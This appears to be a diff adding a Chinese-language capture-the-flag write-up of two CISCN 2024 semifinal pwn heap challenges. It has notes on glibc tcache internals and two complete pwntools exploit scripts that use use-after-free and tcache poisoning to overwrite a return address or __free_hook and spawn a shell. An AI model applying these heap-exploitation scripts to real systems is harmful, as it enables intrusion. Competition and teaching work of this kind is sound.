@@ -336,6 +336,201 @@ awd_pwn_patcher.save()</code></pre>
 <p>链接参考：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45906533/article/details/139937288">https://blog.csdn.net/weixin_45906533/article/details/139937288</a></p>
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/705148718?utm_psn=1788963199141429250">2024全国大学生信息安全竞赛（ciscn）半决赛（华东北赛区）Pwn题解 - 知乎 (zhihu.com)</a></p>
+<h1 id="华南"><a href="#华南" class="headerlink" title="华南"></a>华南</h1><p>一道堆题</p>
+<h2 id="my-heap"><a href="#my-heap" class="headerlink" title="my_heap"></a>my_heap</h2><p>Ubuntu GLIBC 2.35-0ubuntu3.7</p>
+<p>add：输入1能申请任意大小chunk，更新buf指向申请的chunk；非1只能malloc(0x4f0)，不更新buf</p>
+<p>dele：uaf</p>
+<p>show：打印buf-&gt;data 7字节，并且进行异或加密</p>
+<p>edit：往buf里写8字节数据</p>
+<p>getbackdoor：拿到程序基地址以及一次0x20字节写</p>
+<blockquote>
+<p>tcache机制  libc-2.26引入   Ubuntu-17.04以后</p>
+<p>tcache_perthread_struct中存储着各个tcachebin结构体的counts以及bin表头，tcache_entry-&gt;next    </p>
+<p>2.26下tcache不会检查链表完整性，double free</p>
+<p>2.29增加了对size位的chk，需要进行size对齐    增加了链表遍历直接free两次失效，并且counts不能向下溢出</p>
+<p>2.34+增加了PROTECT_PTR(pos, ptr)宏定义来将  ptr_addr&gt;&gt;12与ptr进行异或加密</p>
+<p>tc free时会对e-&gt;key进行赋值，用于检测double free，将key破坏掉就能绕过double的chk</p>
+<p>2.34+ 删除了dl_rtld_lock_recursiveh和dl_rtld_unlock_recursive   没有了malloc_hook等</p>
+<p>getshell方法有：1.栈；2.vtable；3.tls_dtor_list挟持__exit_funcs链表（<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/243196#h2-2">exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)</a>）</p>
+</blockquote>
+<p>攻击思路：</p>
+<ol>
+<li>利用uaf泄露出libc_base和heap_base</li>
+<li>利用getbackdoor来拿程序基地址，以及改写tcachebin_key，实现tcachebin doublefree，但是由于我们每次只能控制buf指向的chunk，所以无法得到两个以上的相同大小的tc来进行tb attack。需要先控制了tcache_perthread_struct结构体中的counts数组，对bin数目进行控制。由于我们只能写8字节，所以挟持到tcache_perthread_struct+0x10后可控0x20~0x50(8&#x2F;2)。然后修改1&lt;counts&lt;7（目的是防止后面的chunk free时被放入到fb中）</li>
+<li>后面就是两次tcachebin attack：利用泄露出来的程序基地址来打buf，此时buf-&gt;buf，然后利用edit修改buf，此时将buf修改为了edit函数的返回地址，然后再利用edit函数修改返回地址为backdoor+8 或者 one_gadget</li>
+</ol>
+<pre><code class="highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
+    sla(<span class="string">b&#x27;magic heap has 4 choice : \nadd\ndelete\nshow\nedit\n&#x27;</span>,<span class="built_in">str</span>(num))
+<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx=<span class="number">1</span>, size=<span class="number">1</span></span>):
+    menu(<span class="number">1</span>)
+    sla(<span class="string">b&#x27;which one you choose?\n&#x27;</span>, <span class="built_in">str</span>(idx))
+    <span class="keyword">if</span> idx != <span class="number">5</span>:
+        sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))
+<span class="keyword">def</span> <span class="title function_">dele</span>():
+    menu(<span class="number">2</span>)
+<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content=<span class="string">b&#x27;aaaa&#x27;</span></span>):
+    menu(<span class="number">4</span>)
+    sa(<span class="string">b&#x27;edit data:&#x27;</span>, content)
+<span class="keyword">def</span> <span class="title function_">show</span>():
+    menu(<span class="number">3</span>)
+    ru(<span class="string">b&#x27;the data:&#x27;</span>)
+    enc = r(<span class="number">7</span>)
+    <span class="comment"># print(enc)</span>
+    <span class="comment"># for i in range(7):</span>
+    <span class="comment">#     enc[i] = enc[i] ^ (i + 153)</span>
+    <span class="comment"># print(enc)</span>
+    dec = [<span class="number">0</span>]*<span class="number">7</span>
+    j = <span class="number">0</span>
+    <span class="keyword">for</span> i <span class="keyword">in</span> enc:
+        dec[j] = i ^ (j+<span class="number">153</span>)
+        j += <span class="number">1</span>
+    <span class="keyword">return</span> uu64(<span class="built_in">bytes</span>(dec))
+        
+        
+<span class="keyword">def</span> <span class="title function_">getBackdoor</span>():
+    menu(<span class="number">5</span>)
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;1 1&#x27;</span>
+    pwnfile = <span class="string">&#x27;./my_heap&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.35-0ubuntu3.7_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+    add(<span class="number">1</span>, <span class="number">0x418</span>)
+    add(<span class="number">5</span>)
+    dele()
+    libc_base = show() - <span class="number">0x21ace0</span>
+    add(<span class="number">1</span>, <span class="number">0x88</span>)
+    dele()  <span class="comment">#tb -&gt; 1</span>
+    heap_addr = show()
+    heap_base = heap_addr &lt;&lt; <span class="number">12</span>
+    getBackdoor()
+    ru(<span class="string">b&#x27;0x&#x27;</span>)
+    ori = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)
+    buf = ori - <span class="number">0x12be</span> + <span class="number">0x04040</span>
+    ru(<span class="string">b&#x27;edit data:&#x27;</span>)
+    s(p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>))  <span class="comment">#key_clean</span>
+    dele()   <span class="comment">#tb -&gt;tcache_perthread -&gt;1</span>
+    edit(p64(heap_base &gt;&gt;<span class="number">12</span> ^(heap_base + <span class="number">0x10</span>)))
+    add(<span class="number">1</span>, <span class="number">0x88</span>)
+    add(<span class="number">1</span>, <span class="number">0x88</span>)
+    dele()
+    edit(p64(<span class="number">0</span>))
+    
+    add(<span class="number">1</span>, <span class="number">0x38</span>)
+    dele()
+    add(<span class="number">1</span>, <span class="number">0x48</span>)
+    dele()
+    add(<span class="number">1</span>, <span class="number">0x288</span>)
+    dele()
+    edit(<span class="string">b&#x27;\x03\x03\x05\x00\x05\x00\x05\x00&#x27;</span>)  <span class="comment">#0x30-&gt;5  0x40-&gt;5  0x50-&gt;5</span>
+
+    add(<span class="number">1</span>, <span class="number">0x38</span>)
+    dele()
+    edit(p64((heap_base&gt;&gt;<span class="number">12</span>)^(libc.sym[<span class="string">&#x27;environ&#x27;</span>] + libc_base)))
+    add(<span class="number">1</span>, <span class="number">0x38</span>)
+    add(<span class="number">1</span>, <span class="number">0x38</span>)
+    stack_addr = show()
+    ret_addr   = stack_addr - <span class="number">0x140</span>
+
+    add(<span class="number">1</span>, <span class="number">0x48</span>)
+    dele()
+    edit(p64((heap_base&gt;&gt;<span class="number">12</span>) ^ (buf)))
+    add(<span class="number">1</span>, <span class="number">0x48</span>)
+    add(<span class="number">1</span>, <span class="number">0x48</span>)
+
+    edit(p64(ret_addr))
+    edit(p64(ori+<span class="number">8</span>))
+    
+    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)
+    leak(<span class="string">&quot;heap_base&quot;</span>, heap_base)
+    leak(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)
+    leak(<span class="string">&quot;ret_addr&quot;</span>, ret_addr)
+    leak(<span class="string">&quot;backdoor_addr&quot;</span>, ori)
+    leak(<span class="string">&quot;buf&quot;</span>, buf)
+    <span class="comment"># leak(&quot;info&quot;, info)</span>
+    <span class="comment"># debug(&#x27;tele $rebase(0x4040) \n \</span>
+    <span class="comment">#       b *$rebase(0x0x148d)&#x27;)</span>
+
+    itr()</code></pre>
+
+
+
+<p>fix的话把uaf给patch掉，backdoor nop掉</p>
+<h1 id="华中"><a href="#华中" class="headerlink" title="华中"></a>华中</h1><h2 id="pwn1-note"><a href="#pwn1-note" class="headerlink" title="pwn1-note"></a>pwn1-note</h2><p>2.31-0ubuntu9.9</p>
+<p>add：size小于0xFFF</p>
+<p>dele：uaf</p>
+<p>edit、show正常</p>
+<p>利用largechunk泄露libc，然后利用uaf改tcache链表为__free_hook</p>
+<pre><code class="highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
+    sla(<span class="string">b&#x27;5. exit\n&#x27;</span>,<span class="built_in">str</span>(num))
+<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):
+    menu(<span class="number">1</span>)
+    sla(<span class="string">b&#x27;The size of your content: \n&#x27;</span>,<span class="built_in">str</span>(size))
+    sla(<span class="string">b&#x27;content: \n&#x27;</span>, content)
+<span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):
+    menu(<span class="number">3</span>)
+    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))
+<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):
+    menu(<span class="number">2</span>)
+    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))
+    sla(<span class="string">b&#x27;The size of your content: \n&#x27;</span>, <span class="built_in">str</span>(size))
+    sa(<span class="string">b&#x27;Content: \n&#x27;</span>, content)
+<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):
+    menu(<span class="number">4</span>)
+    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28278&#x27;</span>
+    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+    add(<span class="number">0x418</span>)  <span class="comment">#0</span>
+    add(<span class="number">0x18</span>)   <span class="comment">#1</span>
+    dele(<span class="number">0</span>)
+    show(<span class="number">0</span>)
+    libc_base = uu64(r64()) - <span class="number">0x1ecbe0</span>
+    add(<span class="number">0x28</span>)  <span class="comment">#2</span>
+    add(<span class="number">0x28</span>)  <span class="comment">#3</span>
+    dele(<span class="number">3</span>)
+    dele(<span class="number">2</span>)    <span class="comment">#0x30: 2-&gt;3</span>
+    edit(<span class="number">2</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))
+    add(<span class="number">0x28</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)  <span class="comment">#4</span>
+    add(<span class="number">0x28</span>)  <span class="comment">#5</span>
+    edit(<span class="number">5</span>, <span class="number">0x8</span>, p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))
+    dele(<span class="number">4</span>)
+
+    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)
+    <span class="comment"># debug(&#x27;tele $rebase(0x04060) \n \</span>
+    <span class="comment">#       tele $rebase(0x06060)&#x27;)</span>
+    itr()
+</code></pre>
+
+
+
 </main>
 
 </article>
